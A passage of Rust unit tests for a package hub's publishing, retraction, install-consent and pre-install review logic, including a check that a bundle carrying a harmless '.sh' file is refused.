            std::fs::read(&artifact).expect("artifact bytes"),
            bytes_before
        );
    }

    #[test]
    fn hub_version_created_at_survives_a_row_rewrite() {
        // The durable guarantee behind release immutability: even a rewrite
        // that reaches the store cannot move when the release was created.
        let (_root, platform) = hub_publish_fixture("Calculator One");
        let (_, first) = publish_calc_tools(&platform, "1.0.0").expect("first publish");

        let mut rewritten = first.clone();
        rewritten.created_at = first.created_at + 86_400;
        rewritten.artifact_sha256 = "0".repeat(64);
        platform
            .hub
            .hub_data
            .put_hub_asset_version(&rewritten)
            .expect("row rewrite");

        let stored = platform
            .hub
            .hub_data
            .get_hub_asset_version("calc-studio.calc-tools", "1.0.0")
            .expect("version lookup")
            .expect("version row");
        assert_eq!(
            stored.created_at, first.created_at,
            "created_at is preserved for the life of a version"
        );
    }

    /// A publisher token for the fixture's publisher.
    fn calc_studio_token(
        platform: &crate::platform::services::PlatformService,
        scopes: &[&str],
    ) -> HubToken {
        platform
            .hub
            .create_token(
                "superadmin",
                "default",
                &CreateHubTokenRequest {
                    publisher_id: "calc-studio".to_string(),
                    title: "Publish token".to_string(),
                    scopes: scopes.iter().map(|item| item.to_string()).collect(),
                    expires_at: None,
                },
            )
            .expect("publisher token")
            .0
    }

    /// The refusal happens at creation, where the value was given, and no
    /// token is stored — the failure used to surface at a different endpoint
    /// entirely, as a scope the token silently never had.
    #[test]
    fn creating_a_token_with_an_unknown_scope_is_refused_and_stores_nothing() {
        let (_root, platform) = hub_publish_fixture("Calculator One");

        let error = platform
            .hub
            .create_token(
                "superadmin",
                "default",
                &CreateHubTokenRequest {
                    publisher_id: "calc-studio".to_string(),
                    title: "Publish token".to_string(),
                    scopes: vec!["read".to_string(), "publish".to_string()],
                    expires_at: None,
                },
            )
            .expect_err("an unknown scope is a request error");
        assert_eq!(error.code, "HUB_TOKEN_SCOPE_INVALID");
        assert!(
            platform
                .hub
                .list_tokens("superadmin", "default")
                .expect("tokens")
                .is_empty(),
            "a refused request creates no token"
        );
    }

    // ── Presentation is the mutable half ────────────────────────────────
    //
    // The release is digest-pinned and cannot be edited. That is only bearable
    // because presentation lives beside it and can be, which these two hold to.

    /// Publishing 1.1.0 says nothing about presentation, so it must change
    /// none of it. It used to blank the summary and the long description and
    /// drop the cover, which made a typo cost a version bump — the exact cost
    /// splitting presentation out of the release was meant to remove.
    #[test]
    fn a_publish_that_omits_presentation_leaves_the_existing_presentation() {
        let (root, platform) = hub_publish_fixture("Calculator One");
        let image_file_path = write_cover_source(&root, 64, 36);
        publish_calc_tools_with_cover(&platform, "1.0.0", &image_file_path)
            .expect("publish with a cover");
        let token = calc_studio_token(&platform, &["hub:publish"]);
        platform
            .hub
            .update_asset_presentation(
                &token,
                "superadmin",
                "default",
                "calc-tools",
                &HubPresentationUpdate {
                    summary: Some("Calculators, batteries included.".to_string()),
                    description_md: Some("# Calc Tools\n\nA long description.".to_string()),
                    ..Default::default()
                },
            )
            .expect("presentation update");

        // A different source, so 1.1.0 is genuinely a new release, published
        // with no summary, no description_md, and no image_file_path.
        write_publish_source(&platform, "Calculator Two");
        let (package, _) = publish_calc_tools(&platform, "1.1.0").expect("second publish");

        assert_eq!(package.summary, "Calculators, batteries included.");
        assert_eq!(
            package.description_md,
            "# Calc Tools\n\nA long description."
        );
        assert_eq!(
            package.media.len(),
            1,
            "the cover survives a publish that names no image"
        );
        assert_eq!(package.media[0].role, "cover");
        assert_eq!(
            package
                .gallery
                .cover
                .as_ref()
                .map(|item| item.media_name.as_str()),
            Some(package.media[0].name.as_str())
        );
        assert!(
            package.image_url.ends_with(&package.media[0].name),
            "image_url still points at the stored cover, got {}",
            package.image_url
        );
    }

    /// The point of the split: editing presentation is not a publish. No
    /// release document, digest, or creation time may move.
    #[test]
    fn a_presentation_update_touches_no_release() {
        let (root, platform) = hub_publish_fixture("Calculator One");
        let (_, released) = publish_calc_tools(&platform, "1.0.0").expect("publish");
        let artifact = root.path().join(&released.artifact_rel_path);
        let bytes_before = std::fs::read(&artifact).expect("release bytes");
        let token = calc_studio_token(&platform, &["hub:publish"]);

        platform
            .hub
            .update_asset_presentation(
                &token,
                "superadmin",
                "default",
                "calc-tools",
                &HubPresentationUpdate {
                    summary: Some("Fixed the typo.".to_string()),
                    ..Default::default()
                },
            )
            .expect("presentation update");

        assert_eq!(
            std::fs::read(&artifact).expect("release bytes"),
            bytes_before,
            "the release document is untouched"
        );
        let stored = platform
            .hub
            .get_asset_version("calc-studio.calc-tools", "1.0.0")
            .expect("version lookup")
            .expect("version row");
        assert_eq!(stored.artifact_sha256, released.artifact_sha256);
        assert_eq!(stored.created_at, released.created_at);
        assert_eq!(
            platform
                .hub
                .list_asset_versions("calc-studio.calc-tools")
                .expect("versions")
                .len(),
            1,
            "no version was created by an edit"
        );
    }

    // ── Retraction ──────────────────────────────────────────────────────

    /// Withdrawing a package destroys its bytes and keeps its coordinates.
    /// Dropping the rows instead would free `package@version` for reuse, which
    /// is the lockfile-invalidating failure immutability exists to prevent,
    /// reached in two steps rather than one.
    #[test]
    fn a_retracted_coordinate_can_never_be_published_again() {
        let (root, platform) = hub_publish_fixture("Calculator One");
        let (_, released) = publish_calc_tools(&platform, "1.0.0").expect("publish");
        let artifact = root.path().join(&released.artifact_rel_path);
        let token = calc_studio_token(&platform, &["hub:publish"]);

        let retracted = platform
            .hub
            .retract_asset_package(&token, "calc-tools", "leaked an API key")
            .expect("retract");
        assert_eq!(retracted, 1);

        assert!(!artifact.exists(), "the release bytes are gone");
        let row = platform
            .hub
            .get_asset_version("calc-studio.calc-tools", "1.0.0")
            .expect("version lookup")
            .expect("the coordinate survives retraction");
        assert!(row.retracted_at.is_some());
        assert_eq!(row.retracted_reason, "leaked an API key");
        let package = platform
            .hub
            .list_asset_packages()
            .expect("packages")
            .into_iter()
            .find(|item| item.package_id == "calc-studio.calc-tools")
            .expect("the package stays listed and explorable");
        assert!(package.retracted_at.is_some());

        // Different content, same coordinate: refused.
        write_publish_source(&platform, "Calculator Two");
        let error = publish_calc_tools(&platform, "1.0.0")
            .expect_err("a retracted coordinate is never reusable");
        assert_eq!(error.code, "HUB_VERSION_RETRACTED");
        assert!(!artifact.exists(), "the refusal writes nothing");
    }

    /// A project that pinned a retracted release reads why, rather than an
    /// io error about a file the retraction deliberately removed.
    #[test]
    fn a_retracted_release_refuses_its_artifact_with_a_reason() {
        let (_root, platform) = hub_publish_fixture("Calculator One");
        publish_calc_tools(&platform, "1.0.0").expect("publish");
        let token = calc_studio_token(&platform, &["hub:publish"]);
        platform
            .hub
            .retract_asset_package(&token, "calc-tools", "superseded by 2.0.0")
            .expect("retract");

        let error = platform
            .hub
            .get_asset_version_install_artifact("calc-studio.calc-tools", "1.0.0")
            .expect_err("a retracted release has no bytes to serve");
        assert_eq!(error.code, "HUB_VERSION_RETRACTED");
        assert!(
            error.message.contains("superseded by 2.0.0"),
            "the publisher's reason travels with the refusal, got {}",
            error.message
        );
    }

    /// Retraction is per package, not per coordinate: a later version may
    /// still be published, and the retracted one stays retracted.
    #[test]
    fn a_retracted_package_still_accepts_a_new_version() {
        let (_root, platform) = hub_publish_fixture("Calculator One");
        publish_calc_tools(&platform, "1.0.0").expect("publish");
        let token = calc_studio_token(&platform, &["hub:publish"]);
        platform
            .hub
            .retract_asset_package(&token, "calc-tools", "bad build")
            .expect("retract");

        write_publish_source(&platform, "Calculator Two");
        let (package, _) = publish_calc_tools(&platform, "2.0.0").expect("publish 2.0.0");
        assert!(
            package.retracted_at.is_none(),
            "a live release makes the package live again"
        );
        assert!(
            platform
                .hub
                .get_asset_version("calc-studio.calc-tools", "1.0.0")
                .expect("version lookup")
                .expect("version row")
                .retracted_at
                .is_some(),
            "the retracted coordinate stays retracted"
        );
    }

    // ── Per-part install consent ────────────────────────────────────────
    //
    // An install used to be all or nothing. These cover the part that is not
    // reversible by deleting a file afterwards: whether the SQL ran.

    const SEED_SQL: &str = "-- posts for the demo blog\n\
        CREATE TABLE posts (_key TEXT PRIMARY KEY, title TEXT);\n\
        INSERT INTO posts (_key, title) VALUES ('a', 'Hello');\n";

    const PAGE_TSX: &str = "export default function Home() { return <div>hi</div>; }\n";

    const SEED_REL_PATH: &str = "seeds/sekejap/001-posts.sql";

    /// A `zebflow.yaml` taken from a real project, so a bundle built here has
    /// the one file the install refuses to run without.
    fn source_project_configuration(
        platform: &crate::platform::services::PlatformService,
    ) -> String {
        if platform
            .projects
            .get_project("superadmin", "seedsource")
            .expect("project lookup")
            .is_none()
        {
            platform
                .projects
                .create_or_update_project(
                    "superadmin",
                    &CreateProjectRequest {
                        project: "seedsource".to_string(),
                        title: Some("Seed Source".to_string()),
                        local_branch: None,
                        runtime: ProjectRuntimeSelectionRequest::default(),
                    },
                )
                .expect("a source project to take a valid configuration from");
        }
        let layout = platform
            .projects
            .project_layout("superadmin", "seedsource")
            .expect("source layout");
        std::fs::read_to_string(layout.repo_dir.join(PROJECT_CONFIGURATION_FILE))
            .expect("the source project has a configuration")
    }

    /// A project bundle carrying one page and one seed script, with a
    /// `zebflow.yaml` taken from a real project so the install has the one file
    /// it refuses to run without.
    fn seeded_project_bundle(
        platform: &crate::platform::services::PlatformService,
    ) -> HubPackageSpec {
        let configuration = source_project_configuration(platform);

        serde_json::from_value(serde_json::json!({
            "asset_kind": HUB_ASSET_KIND_PROJECT_BUNDLE,
            "title": "Seeded Blog",
            "description": "A bundle with one page and one seed script.",
            "project_initialization": {
                "initial_data": [{
                    "engine": "sekejap",
                    "path": SEED_REL_PATH,
                    "statement_count": 2,
                    "size_bytes": SEED_SQL.len(),
                }],
            },
            "files": [
                {
                    "rel_path": PROJECT_CONFIGURATION_FILE,
                    "kind": "config", "size_bytes": configuration.len(),
                    "reason": "project configuration", "content": configuration,
                },
                {
                    "rel_path": "pages/home.tsx", "kind": "template",
                    "size_bytes": PAGE_TSX.len(), "reason": "page", "content": PAGE_TSX,
                },
                {
                    "rel_path": SEED_REL_PATH, "kind": "initial data",
                    "size_bytes": SEED_SQL.len(), "reason": "seed", "content": SEED_SQL,
                },
            ],
        }))
        .expect("package spec")
    }

    /// Why a channel that only moved the document cannot fetch referenced
    /// bytes.
    const CHANNEL_WITHOUT_AN_ARTIFACT_LOCATION: &str =
        "this channel does not say where its artifacts live";

    fn no_channel() -> HubArtifactChannel {
        HubArtifactChannel::unresolvable(CHANNEL_WITHOUT_AN_ARTIFACT_LOCATION)
    }

    /// The default is the behaviour that existed before consent flags did: the
    /// whole bundle lands and its SQL runs.
    #[test]
    fn the_default_scope_installs_everything_and_runs_the_seed() {
        let root = tempfile::tempdir().unwrap();
        let platform = test_platform(&root);
        let bundle = seeded_project_bundle(&platform);

        let result = platform
            .hub
            .install_project_bundle(
                "superadmin",
                "seeded-blog",
                &bundle,
                &no_channel(),
                HubInstallScope::default(),
            )
            .expect("the whole bundle installs");

        let repo = root.path().join("users/superadmin/seeded-blog/repo");
        assert!(repo.join("pages/home.tsx").is_file());
        assert!(repo.join(SEED_REL_PATH).is_file());
        assert!(result.skipped_files.is_empty());
        assert!(result.schema_executed);
        assert!(
            sekejap::list_tables(&root.path().to_path_buf(), "superadmin", "seeded-blog")
                .expect("the store answers")
                .iter()
                .any(|table| table.table == "posts"),
            "the seed created its table"
        );
    }

    /// The one that matters: the schema lands in repo/ and the store is left
    /// exactly as the install found it, for the user to run themselves.
    #[test]
    fn a_schema_only_install_writes_the_sql_without_running_it() {
        let root = tempfile::tempdir().unwrap();
        let platform = test_platform(&root);
        let bundle = seeded_project_bundle(&platform);

        let result = platform
            .hub
            .install_project_bundle(
                "superadmin",
                "seeded-blog",
                &bundle,
                &no_channel(),
                HubInstallScope {
                    include_code: false,
                    include_schema: true,
                    execute_schema: false,
                },
            )
            .expect("a schema-only install is a valid install");

        let repo = root.path().join("users/superadmin/seeded-blog/repo");
        assert_eq!(
            std::fs::read_to_string(repo.join(SEED_REL_PATH)).expect("the seed is on disk"),
            SEED_SQL,
            "the user gets the schema to run themselves"
        );
        assert!(
            !repo.join("pages/home.tsx").exists(),
            "code was not part of this install"
        );
        assert!(
            repo.join(crate::contracts::kinds::PROJECT_CONFIGURATION_FILE)
                .is_file(),
            "the project keeps the configuration it cannot exist without"
        );
        assert!(
            sekejap::list_tables(&root.path().to_path_buf(), "superadmin", "seeded-blog")
                .expect("the store answers")
                .is_empty(),
            "nothing was replayed into the store"
        );

        assert!(!result.schema_executed);
        assert_eq!(result.skipped_files, vec!["pages/home.tsx".to_string()]);
        assert_eq!(
            result.unexecuted_initial_data,
            vec![SEED_REL_PATH.to_string()],
            "a partial install says which scripts are still waiting"
        );
        let report = result
            .database_initialization
            .first()
            .expect("the result describes the SQL it wrote");
        assert_eq!(report.source, SEED_REL_PATH);
        assert_eq!(report.tables, vec!["posts".to_string()]);
        assert_eq!(report.store, "created by this install");
    }

    /// Running SQL that is never written is a contradiction, so it is answered
    /// as a request error instead of being quietly downgraded to "do not run".
    #[test]
    fn an_install_that_would_run_sql_it_never_writes_is_refused() {
        let root = tempfile::tempdir().unwrap();
        let platform = test_platform(&root);
        let bundle = seeded_project_bundle(&platform);

        let error = platform
            .hub
            .install_project_bundle(
                "superadmin",
                "seeded-blog",
                &bundle,
                &no_channel(),
                HubInstallScope {
                    include_code: true,
                    include_schema: false,
                    execute_schema: true,
                },
            )
            .expect_err("execute_schema without include_schema is not a smaller install");

        assert_eq!(error.code, "HUB_INSTALL_SCOPE_INVALID");
        assert!(
            !root.path().join("users/superadmin/seeded-blog").exists(),
            "a rejected request creates nothing"
        );
    }

    /// A scope that installs neither code nor schema installs nothing, and says
    /// so rather than reporting a successful empty install.
    #[test]
    fn an_install_of_nothing_is_refused() {
        let error = HubInstallScope {
            include_code: false,
            include_schema: false,
            execute_schema: false,
        }
        .validate()
        .expect_err("an empty install is a request error");

        assert_eq!(error.code, "HUB_INSTALL_SCOPE_INVALID");
    }

    // ── Pre-install review ──────────────────────────────────────────────
    //
    // The project bundle path creates a project, writes files, applies both
    // schema engines, runs seed SQL, registers pipelines and activates some of
    // them. These cover the one thing that makes a review worth reading: that
    // it says what the install then does, and writes nothing saying it.

    const FEED_PIPELINE: &str = r#"{
  "apiVersion":"zebflow.com/v1",
  "kind":"Pipeline",
  "metadata":{"name":"feed"},
  "spec":{
  "id":"feed",
  "description":"The blog feed.",
  "entry_nodes":["trigger_webhook"],
  "nodes":[
    {"id":"trigger_webhook","kind":"n.trigger.webhook","input_pins":[],"output_pins":["out"],"config":{"path":"/feed","method":"GET"}}
  ],
  "edges":[]}
}"#;

    /// A bundle with a destination, a registration, an activation and a
    /// database effect, so a review has one of each to report.
    fn reviewable_project_bundle(
        platform: &crate::platform::services::PlatformService,
    ) -> HubPackageSpec {
        let configuration = source_project_configuration(platform);
        serde_json::from_value(serde_json::json!({
            "asset_kind": HUB_ASSET_KIND_PROJECT_BUNDLE,
            "title": "Seeded Blog",
            "description": "A bundle with a page, a pipeline and a seed script.",
            "active_pipelines": ["feed.zf.json"],
            "project_initialization": {
                "initial_data": [{
                    "engine": "sekejap",
                    "path": SEED_REL_PATH,
                    "statement_count": 2,
                    "size_bytes": SEED_SQL.len(),
                }],
            },
            "files": [
                {
                    "rel_path": PROJECT_CONFIGURATION_FILE,
                    "kind": "config", "size_bytes": configuration.len(),
                    "reason": "project configuration", "content": configuration,
                },
                {
                    "rel_path": "pipelines/pages/home.tsx", "kind": "template",
                    "size_bytes": PAGE_TSX.len(), "reason": "page", "content": PAGE_TSX,
                },
                {
                    "rel_path": "pipelines/feed.zf.json", "kind": "pipeline",
                    "size_bytes": FEED_PIPELINE.len(), "reason": "feed",
                    "content": FEED_PIPELINE,
                },
                {
                    "rel_path": SEED_REL_PATH, "kind": "initial data",
                    "size_bytes": SEED_SQL.len(), "reason": "seed", "content": SEED_SQL,
                },
            ],
        }))
        .expect("package spec")
    }

    /// The whole point of the review: what it names is what happens.
    ///
    /// The install's own report is checked against the project afterwards, so
    /// "the review matches the install" cannot be satisfied by both being wrong
    /// in the same way.
    #[test]
    fn the_review_reports_exactly_what_the_install_performs() {
        let root = tempfile::tempdir().unwrap();
        let platform = test_platform(&root);
        let bundle = reviewable_project_bundle(&platform);

        let review = platform
            .hub
            .review_project_bundle(
                "superadmin",
                "seeded-blog",
                "1.0.0",
                &bundle,
                &no_channel(),
                HubInstallScope::default(),
            )
            .expect("the bundle reviews");

        assert!(review.installable);
        assert!(review.violations.is_empty());
        assert_eq!(review.project, "seeded-blog");
        assert_eq!(
            review.pipelines_registered,
            vec!["feed.zf.json".to_string()]
        );
        assert_eq!(review.pipelines_activated, vec!["feed.zf.json".to_string()]);
        assert!(review.pipelines_not_activated.is_empty());
        assert!(review.skipped_files.is_empty());
        let initialization = review
            .database_initialization
            .first()
            .expect("the review says what the seed SQL does before it runs");
        assert_eq!(initialization.source, SEED_REL_PATH);
        assert_eq!(initialization.tables, vec!["posts".to_string()]);

        let result = platform
            .hub
            .install_project_bundle(
                "superadmin",
                "seeded-blog",
                &bundle,
                &no_channel(),
                HubInstallScope::default(),
            )
            .expect("the reviewed bundle installs");

        assert_eq!(result.project, review.project);
        assert_eq!(result.files_written, review.files_written);
        assert_eq!(result.skipped_files, review.skipped_files);
        assert_eq!(result.pipelines_registered, review.pipelines_registered);
        assert_eq!(result.pipelines_activated, review.pipelines_activated);
        assert_eq!(
            result.pipelines_not_activated,
            review.pipelines_not_activated
        );
        assert_eq!(
            result.database_initialization,
            review.database_initialization
        );
        assert_eq!(result.schema_executed, review.schema_executed);

        // What the install reported is what the project has.
        let repo = root.path().join("users/superadmin/seeded-blog/repo");
        for rel in &result.files_written {
            assert!(repo.join(rel).is_file(), "{rel} was reported and written");
        }
        let registered = platform
            .projects
            .list_pipeline_meta_rows("superadmin", "seeded-blog")
            .expect("the project answers")
            .into_iter()
            .map(|meta| meta.file_rel_path)
            .collect::<Vec<_>>();
        assert_eq!(registered, result.pipelines_registered);
        let active = platform
            .projects
            .list_active_pipeline_meta("superadmin", "seeded-blog")
            .expect("the project answers")
            .into_iter()
            .map(|meta| meta.file_rel_path)
            .collect::<Vec<_>>();
        assert_eq!(active, result.pipelines_activated);
    }

    /// A review is a read. Nothing about the target may exist afterwards -- not
    /// the project, not its files, not its store -- or the review has performed
    /// part of the install it was asked to describe.
    #[test]
    fn reviewing_a_project_bundle_writes_nothing() {
        let root = tempfile::tempdir().unwrap();
        let platform = test_platform(&root);
        let bundle = reviewable_project_bundle(&platform);

        platform
            .hub
            .review_project_bundle(
                "superadmin",
                "seeded-blog",
                "1.0.0",
                &bundle,
                &no_channel(),
                HubInstallScope::default(),
            )
            .expect("the bundle reviews");

        assert!(
            platform
                .projects
                .get_project("superadmin", "seeded-blog")
                .expect("project lookup")
                .is_none(),
            "the review created no project row"
        );
        assert!(
            !root.path().join("users/superadmin/seeded-blog").exists(),
            "the review created no repository, no files and no store"
        );

        // And the install that follows is a whole install, not a resumed one.
        let result = platform
            .hub
            .install_project_bundle(
                "superadmin",
                "seeded-blog",
                &bundle,
                &no_channel(),
                HubInstallScope::default(),
            )
            .expect("the reviewed bundle installs");
        assert_eq!(result.project, "seeded-blog");
        assert!(
            sekejap::list_tables(&root.path().to_path_buf(), "superadmin", "seeded-blog")
                .expect("the store answers")
                .iter()
                .any(|table| table.table == "posts"),
            "the seed ran during the install and not during the review"
        );
    }

    /// A package the install refuses reads as `installable: false` with the
    /// same violations, rather than as an error a caller has to interpret.
    #[test]
    fn a_refused_bundle_reviews_as_uninstallable_with_the_install_s_violations() {
        let root = tempfile::tempdir().unwrap();
        let platform = test_platform(&root);
        let configuration = source_project_configuration(&platform);
        let bundle: HubPackageSpec = serde_json::from_value(serde_json::json!({
            "asset_kind": HUB_ASSET_KIND_PROJECT_BUNDLE,
            "title": "Scripted",
            "description": "A bundle carrying a shell script.",
            "files": [
                {
                    "rel_path": PROJECT_CONFIGURATION_FILE,
                    "kind": "config", "size_bytes": configuration.len(),
                    "reason": "project configuration", "content": configuration,
                },
                {
                    "rel_path": "pipelines/postinstall.sh", "kind": "file",
                    "size_bytes": 5, "reason": "test", "content": "true\\n",
                },
            ],
        }))
        .expect("package spec");

        let review = platform
            .hub
            .review_project_bundle(
                "superadmin",
                "scripted",
                "1.0.0",
                &bundle,
                &no_channel(),
                HubInstallScope::default(),
            )
            .expect("a refused bundle still reviews");

        assert!(!review.installable);
        assert_eq!(review.risk_level, "blocked");
        assert_eq!(
            review.violations,
            vec![
                "pipelines/postinstall.sh: extension '.sh' is not a file type a package may install"
                    .to_string()
            ]
        );

        let error = platform
            .hub
            .install_project_bundle(
                "superadmin",
                "scripted",
                &bundle,
                &no_channel(),
                HubInstallScope::default(),
            )
            .expect_err("what the review refuses the install refuses");
        assert_eq!(error.code, "HUB_REMOTE_INSTALL_REFUSED");
        for violation in &review.violations {
            assert!(
                error.message.contains(violation),
                "the install refuses with the violation the review showed: {}",
                error.message
            );
        }
        assert!(
            !root.path().join("users/superadmin/scripted").exists(),
            "neither call created a project"
        );
    }

    /// The consent flags are what the review answers for: turn code off and it
    /// reports the code as skipped, the pipeline as neither registered nor
    /// activated, and the SQL as written but waiting.
    #[test]
    fn the_review_reports_what_the_consent_flags_would_skip() {
        let root = tempfile::tempdir().unwrap();
        let platform = test_platform(&root);
        let bundle = reviewable_project_bundle(&platform);
        let scope = HubInstallScope {
            include_code: false,
            include_schema: true,
            execute_schema: false,
        };

        let review = platform
            .hub
            .review_project_bundle(
                "superadmin",
                "seeded-blog",
                "1.0.0",
                &bundle,
                &no_channel(),
                scope,
            )
            .expect("a schema-only install reviews");

        assert_eq!(
            review.skipped_files,
            vec![
                "pipelines/feed.zf.json".to_string(),
                "pipelines/pages/home.tsx".to_string(),
            ]
        );
        assert!(review.pipelines_registered.is_empty());
        assert!(review.pipelines_activated.is_empty());
        assert_eq!(
            review.pipelines_not_activated,
            vec!["feed.zf.json".to_string()],
            "a pipeline the bundle names active is reported as not activated"
        );
        assert!(!review.schema_executed);
        assert_eq!(
            review.unexecuted_initial_data,
            vec![SEED_REL_PATH.to_string()]
        );
        assert_eq!(
            review.database_initialization.len(),
            1,
            "the SQL is still described, because it is still written"
        );

        let result = platform
            .hub
            .install_project_bundle("superadmin", "seeded-blog", &bundle, &no_channel(), scope)
            .expect("a schema-only install installs");
        assert_eq!(result.files_written, review.files_written);
        assert_eq!(result.skipped_files, review.skipped_files);
        assert_eq!(result.pipelines_registered, review.pipelines_registered);
        assert_eq!(result.pipelines_activated, review.pipelines_activated);
        assert_eq!(
            result.pipelines_not_activated,
            review.pipelines_not_activated
        );
        assert_eq!(
            result.unexecuted_initial_data,
            review.unexecuted_initial_data
        );
    }

    // ── Publisher layout and placement ──────────────────────────────────
    //
    // A manifest's rel_path values were produced by the publisher's layout and
    // are consumed by the installer's, and the two need not match. These cover
    // what a package records about its own paths and where they then land.

    const HUB_LAYOUT_PAGE: &str = "export default function Feed() { return <div>feed</div>; }\n";
    const HUB_LAYOUT_LOGO: &str = "<svg xmlns=\"http://www.w3.org/2000/svg\"/>";
    const HUB_LAYOUT_DOC: &str = "# Spatial Blogging\n\nHow to run it.\n";

    /// Writes one file into every area a layout names, so an install has
    /// something to place in each of them.
    fn write_spatial_blogging_source(platform: &crate::platform::services::PlatformService) {
        platform
            .projects
            .delete_pipeline("superadmin", "default", "calc.zf.json")
            .expect("the publish fixture's own pipeline is not part of this application");
        platform
            .projects
            .write_template_file(
                "superadmin",
                "default",
                &crate::platform::model::TemplateSaveRequest {
                    rel_path: "pages/feed.tsx".to_string(),
                    content: HUB_LAYOUT_PAGE.to_string(),
                },
            )
            .expect("page");
        platform
            .projects
            .upsert_pipeline_definition(
                "superadmin",
                "default",
                "blog/feed.zf.json",
                "Feed",
                "Renders the feed.",
                "webhook",
                &serde_json::json!({
                    "apiVersion": "zebflow.com/v1",
                    "kind": "Pipeline",
                    "metadata": {"name": "feed"},
                    "spec": {
                        "id": "feed",
                        "entry_nodes": ["wh"],
                        "nodes": [
                            {"id": "wh", "kind": "n.trigger.webhook", "input_pins": [],
                             "output_pins": ["out"], "config": {"path": "/feed", "method": "GET"}},
                            {"id": "res", "kind": "n.web.response", "input_pins": ["in"],
                             "output_pins": ["out"], "config": {"template": "pages/feed.tsx"}}
                        ],
                        "edges": [{"from_node": "wh", "from_pin": "out",
                                   "to_node": "res", "to_pin": "in"}]
                    }
                })
                .to_string(),
            )
            .expect("pipeline");
        let layout = platform
            .projects
            .project_layout("superadmin", "default")
            .expect("publisher layout");
        for (dir, name, content) in [
            (layout.repo_assets_dir(), "logo.svg", HUB_LAYOUT_LOGO),
            (layout.repo_docs_dir(), "README.md", HUB_LAYOUT_DOC),
        ] {
            std::fs::create_dir_all(&dir).expect("area directory");
            std::fs::write(dir.join(name), content).expect("area file");
        }
    }

    /// A target project that keeps its source somewhere else entirely.
    fn project_declaring_src(
        platform: &crate::platform::services::PlatformService,
        project: &str,
    ) -> ProjectFileLayout {
        platform
            .projects
            .create_or_update_project(
                "superadmin",
                &CreateProjectRequest {
                    project: project.to_string(),
                    title: Some("Declared".to_string()),
                    local_branch: None,
                    runtime: ProjectRuntimeSelectionRequest::default(),
                },
            )
            .expect("target project");
        platform
            .zebflow_cfg
            .update("superadmin", project, |cfg| {
                cfg.configs.layout.source = Some("src".to_string());
            })
            .expect("declare source");
        platform
            .projects
            .project_layout("superadmin", project)
            .expect("target layout")
    }

    fn publish_spatial_blogging(
        platform: &crate::platform::services::PlatformService,
        source_type: &str,
        source_ref: &str,
        package: &str,
    ) {
        platform
            .hub
            .publish_asset(
                "superadmin",
                "default",
                "superadmin",
                "calc-studio",
                "",
                "",
                "",
                "superadmin",
                "default",
                source_type,
                source_ref,
                package,
                "1.0.0",
                "Spatial Blogging",
                "A whole small application.",
                "",
                "public",
                HubProjectBundlePublishOptions {
                    include_sekejap_schema: false,
                    include_sqlite_schema: false,
                    include_libraries: Vec::new(),
                    include_initial_data: false,
                    initial_data_paths: Vec::new(),
                },
                Vec::new(),
            )
            .expect("publish");
    }

    /// The destinations a review promised, as one sorted list.
    fn reviewed_destinations(review: &HubInstallReview) -> Vec<String> {
        let mut all = review.files_added.clone();
        all.extend(review.files_overwritten.clone());
        all.sort();
        all
    }

    /// A release records the layout its paths were produced by, so a receiver
    /// is not left guessing which portion of a path was structure.
    #[test]
    fn a_release_records_the_layout_its_paths_were_produced_by() {
        let (_root, platform) = hub_publish_fixture("Calculator One");
        let (_, version) = publish_calc_tools(&platform, "1.0.0").expect("publish");
        let manifest: HubPackageSpec =
            serde_json::from_value(version.manifest).expect("manifest spec");
        let layout = manifest.layout.expect("a publish records its layout");
        assert_eq!(layout.source.as_deref(), Some("pipelines"));
        assert_eq!(layout.assets.as_deref(), Some("pipelines/assets"));
        assert_eq!(layout.docs.as_deref(), Some("docs"));
        // Every entry is written out, not only the ones that differ from the
        // default: a release must mean the same thing forever.
        assert_eq!(layout.schema.as_deref(), Some("schemas/sekejap"));
        assert_eq!(layout.sqlite_schema.as_deref(), Some("schemas/sqlite"));
        assert_eq!(layout.node_interfaces.as_deref(), Some("nodes"));
    }

    /// The publisher kept its source in `pipelines`; the receiver keeps its own
    /// in `src`. The package's source files have to arrive in the receiver's
    /// source root with the publisher's root removed rather than carried along
    /// as a stray segment.
    #[test]
    fn a_package_published_from_pipelines_installs_into_a_project_declaring_src() {
        let (root, platform) = hub_publish_fixture("Calculator One");
        write_spatial_blogging_source(&platform);
        publish_spatial_blogging(
            &platform,
            "pipeline_with_dependencies",
            "blog/feed.zf.json",
            "feed-tools",
        );
        let target = project_declaring_src(&platform, "atlas");

        let review = platform
            .hub
            .review_asset_install("superadmin", "atlas", "calc-studio.feed-tools", "1.0.0", "")
            .expect("review");
        assert_eq!(review.install_root, "src/hub/calc-studio.feed-tools");
        assert_eq!(
            reviewed_destinations(&review),
            vec![
                "src/hub/calc-studio.feed-tools/blog/feed.zf.json".to_string(),
                "src/hub/calc-studio.feed-tools/pages/feed.tsx".to_string(),
            ],
            "the publisher's source root is removed, not carried along"
        );
        assert_eq!(
            review.pipelines_registered,
            vec!["hub/calc-studio.feed-tools/blog/feed.zf.json".to_string()]
        );

        let result = platform
            .hub
            .install_asset("superadmin", "atlas", "calc-studio.feed-tools", "1.0.0", "")
            .expect("install");
        assert_eq!(result.pipelines_registered, review.pipelines_registered);
        for destination in reviewed_destinations(&review) {
            assert!(
                target.repo_dir.join(&destination).is_file(),
                "the review promised {destination}"
            );
        }
        let _ = root;
    }

    /// A package written before `spec.layout` existed carries no layout, so it
    /// resolves through the platform default -- the layout every project had
    /// when that package was published. Nothing about it has to be reissued.
    #[test]
    fn a_package_published_before_this_field_existed_still_installs() {
        let root = tempfile::tempdir().unwrap();
        let platform = test_platform(&root);
        let target = project_declaring_src(&platform, "atlas");

        // Written the way a package of that vintage was written: no layout key
        // at all, and paths rooted at the source directory the platform used to
        // hardcode. Decoded through the contract so the absence is proven to be
        // accepted rather than assumed.
        let pipeline = serde_json::json!({
            "apiVersion": "zebflow.com/v1",
            "kind": "Pipeline",
            "metadata": {"name": "feed"},
            "spec": {"id": "feed", "entry_nodes": [], "nodes": [], "edges": []}
        })
        .to_string();
        let document = serde_json::json!({
            "apiVersion": "zebflow.com/v1",
            "kind": "HubPackage",
            "metadata": {"name": "legacy-tools", "version": "1.0.0"},
            "spec": {
                "asset_kind": HUB_ASSET_KIND_PIPELINE_BUNDLE,
                "title": "Legacy Tools",
                "description": "Published before a package recorded its layout.",
                "files": [
                    {"rel_path": "pipelines/blog/feed.zf.json", "kind": "pipeline",
                     "size_bytes": pipeline.len(), "reason": "primary pipeline",
                     "content": pipeline},
                    {"rel_path": "pipelines/pages/feed.tsx", "kind": "tsx",
